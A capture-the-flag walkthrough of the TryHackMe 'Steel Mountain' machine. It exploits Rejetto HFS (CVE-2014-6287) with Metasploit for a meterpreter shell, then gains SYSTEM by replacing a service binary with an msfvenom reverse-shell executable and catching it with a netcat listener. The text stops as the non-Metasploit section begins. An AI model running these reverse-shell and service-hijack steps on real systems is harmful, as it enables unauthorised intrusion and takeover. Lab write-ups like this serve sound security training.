# Steel mountain

This is a Write up for the Steel Mountain machine form TryHackMe you can find the link and details about the room in the [README.md](https://github.com/mil0666/tryhackme-writeups/blob/main/README.md)
**FIY**: words that are marked *LIKE THIS* are commands that you can use in you terminal



First what I like to do with any machine turn on nmap and gobuster and let them run in the background I have my nappy.sh and
gobuddy-dir.sh "scripts"

nappy.sh - *nmap -sS -sV -A -O $IP*

gobuddy-dir.sh - *gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt*

I usually use seclists for this you can find them here - https://github.com/danielmiessler/SecLists

### INITIAL ACCESS

While our scans are going in the background we can take a look at our target through the browser


I tried to zoom in here to see if his name is written on the shirt but no luck,
My next try was going to View source for this page and there it was /img/BillHarper.png
So there we have our first answer.

1. Who is the employee of the month?

   **bill harper**


 2. Scan the machine with nmap. What is the other port running a web server on?
   Good thing we got the nmap scan already running so we know the answer to this is

    **8080**

![image](https://user-images.githubusercontent.com/81188817/112178397-fc3e7000-8bf9-11eb-8fa1-6a2df846e24d.png)


3. Take a look at the other web server. What file server is running?

    So in the screen shot above we can see it is a HttpFileServer 2.3
    but that is only the part of the server. If you don't see this HttpFileServer 2.3. hyperlinked below the Actions the first time you go to the link, feel free to click around     a bit or refresh the page and it will appear.
    When you actually click on it it will take you this link - http://www.rejetto.com/hfs/

    So with this we now have the whole answer:

    **Rejetto http file server**

4. What is the CVE number to exploit this file server?

    We can either use google (exploit-db) or searchsploit to find exploits for this HFS:
    You can just google CVE rejetto http file server and the firs exploit-db link I got is this:

    https://www.exploit-db.com/exploits/39161

    So the answer is:  **2014-6287**

The command for searchsploit is:
*searchsploit rejetto http file server*

Here we can see searchsploit results and we can see the **39161.py** that we will need for this machine a bit later, so you can just copy that python script to your working directory so you don't have to look for it later.

![image](https://user-images.githubusercontent.com/81188817/112178754-517a8180-8bfa-11eb-9385-edb25129e52f.png)


 *cp /usr/share/exploitdb/exploits/windows/remote/39161.py Desktop/thm/steelmountain/* - this will copy the python script.

 5. Use Metasploit to get an initial shell. What is the user flag?

     Okay we will first start metasploit by running msfconsole in our terminal
     There in the msfconsole you will use *search* command is msfconsole to find the exploit that we need:
     *search rejetto http file server* - we only got one exploit so we will go and use that one with the command *use 0*
     out default payload is windows/meterpreter/reverse_tcp which is what we need so we'll leave it as is

 ![image](https://user-images.githubusercontent.com/81188817/112179056-9f8f8500-8bfa-11eb-9691-d392c64a7f41.png)


 Then you'll type in *options* to see what we have to configure in order for this payload to work:

 ![image](https://user-images.githubusercontent.com/81188817/112179080-a61dfc80-8bfa-11eb-8ce2-2c91ff2648bf.png)

 ##### What we need to configure:

RHOST & RPORT  - These will be our target machine IP address and the port 8080

SRVHOST & SRVPORT - these will be your attacking machine IP address (usually tun0 interface, you can find this via *ip addr* command), and for the port you can put any port      that isn't already busy, but I would recommend a higher number port e.g. 4848

 Also you have to configure the two for the payload as well:
 LHOST & LPORT, there I configured the same IP address (our attacking machine, tun0) but a different port then what we configured for the the **SRVPORT**

 We use the prefix set e.g. *set LPORT 4848* for all the options.

 After we set up everything you can just type *run* or *exploit* and you should get a meterpreter shell.
 There we can use the *migrate* command to migrate to a more stable process so our session doesn't break in the middle of our priv esc :D

 ![image](https://user-images.githubusercontent.com/81188817/112179284-d8c7f500-8bfa-11eb-9fa3-08e537ff896c.png)

 To see the processes you can type *ps* and migrate using the process PID number, here I migrated to the explorer.exe process using its PID.

  After this we can go and fetch the user flag, first we have to locate it the logical path is to go to the Users desktop and search there:

![image](https://user-images.githubusercontent.com/81188817/112179337-e54c4d80-8bfa-11eb-8fa0-02937ce812b8.png)

 ### PRIVELEGDE ESCALATION WITH METASPLOIT:

First what we need to do is download the **PowerUp.ps1** script to our working directory on our attacking machine since this is what we will be using for our priv ecs on the    target machine.

 You can find the script here - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

 When you use the *wget* command be sure that you click RAW for the script and then *wget* it like that to your machine
 The full command is:

  *wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1*

  Then on our meterpreter shell we use upload to get it onto the windows target machine so:
  *upload PowerUp.ps1*  (if this doesn't work use the full path to the file e.g. /home/user/Desktop/PowerUp.ps1)

  So now we have the script on Bills desktop.

  In order for us to use this powershell script we have to first prepare so we will type *load powershell* to load the powershell extension and than *powershell_shell* to get our shell
  so we can actually use the script * . .\PowerUp.ps1 * and after that Invoke-AllChecks
 It should look like this:

 ![image](https://user-images.githubusercontent.com/81188817/112180478-e16cfb00-8bfb-11eb-8f5f-8212bdff6a5d.png)


 Pay close attention to the **CanRestart** option that is set to true. What is the name of the name of the service which shows up as an _unquoted service path_ vulnerability?

 So basically the first service that appears: **AdvancedSystemCareService9** is the one that has CanRestart marked True and it is located under C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

 We have the explanation in the room why the CanRestart is important:

 The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

 Use msfvenom to generate a reverse shell as an Windows executable. The command I used was:

  *msfvenom -p windows/shell_reverse_tcp LHOST=10.14.7.187 LPORT=5556 -f exe -o ASCService.exe*

  -p is for payload and here we specify the payload that we wanna use

  LHOST and LPORT is the IP of your attacking machine and the port of your choosing

  -f is type of file, here we specified exe

  -o the output file, I named it the same as the exe of the service we want to copy over.

  So we'll go to our folder on the target machine where the exe file of the service is stored

  *cd C:/"Program Files (x86)"/IObit/"Advanced SystemCare"/*

  We have to put quotations because of the spaces, we can't cd without them into these folders.

  When we're there we will stop the ASCService.exe, but first type in *shell* to get a shell where we can actually stop the service since I haven't found a way to do this from     meterpreter:

  After you get the shell type:  *net stop AdvancedSystemCareService9*

 ![image](https://user-images.githubusercontent.com/81188817/112180605-fea1c980-8bfb-11eb-9c1e-7146c7afa6e2.png)


  Then we leave this shell so we can *upload* our payload through meterpreter and get back the shell. You do this with CTRL+C or *exit*
  And then upload the payload the same way we did with the PowerUp.ps1 script:

  ![image](https://user-images.githubusercontent.com/81188817/112180784-25600000-8bfc-11eb-9fb6-3039d8c46968.png)


  Before we start the service again make sure you have a nc listener on your attacking machine with the port you defined  while making the payload in msfvenom (LPORT option):
  In my case it's:

  *nc -lvnp 5556*

  And then go to the targer machine go ahead and type *shell* first and then start the service with

  *net start AdvancedSystemCareService9*

  And voilà you will get a reverse shell.

  When you type *whoami* you will se you are **nt authority\system** which is root for windows.

  From there you can go ahead to the Administrators desktop and look for the flag.

![image](https://user-images.githubusercontent.com/81188817/112180844-33ae1c00-8bfc-11eb-8be6-b8b8a18ab7f2.png)

### PRIVELEGDE ESCALATION WITHOUT METASPLOIT:

Remember the python script that I said you should save to your working directory cause we're gonna use it later, well later is now :D 

If you didn't save it then no big deal you can just go to you directory and type:
*cp /usr/share/exploitdb/exploits/windows/remote/39161.py* - this will copy the script to you current directory sdsd
